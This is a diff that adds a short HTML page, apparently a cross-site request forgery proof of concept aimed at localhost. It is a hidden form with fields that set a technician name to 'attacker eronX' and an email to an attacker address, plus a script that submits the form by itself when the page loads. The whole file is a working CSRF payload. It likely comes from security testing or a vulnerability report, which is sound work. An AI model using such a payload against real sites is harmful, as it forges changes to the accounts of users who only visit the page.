@@ -1,0 +1,12 @@
+<html>
+  <body>
+    <form action="https://localhost" method="POST" id="csrf-form">
+      <input type="hidden" name="utf8" value="â&#156;&#147;" />
+      <input type="hidden" name="tech&#91;name&#93;" value="attacker&#32;eronX" />
+      <input type="hidden" name="tech&#91;email&#93;" value="eron&#64;invalidwebsecuriy&#46;info" />
+      <input type="hidden" name="commit" value="Save" />
+      <input type="hidden" value="Submit request" />
+    </form>
+    <script>document.getElementById("csrf-form").submit()</script>
+  </body>
+</html>
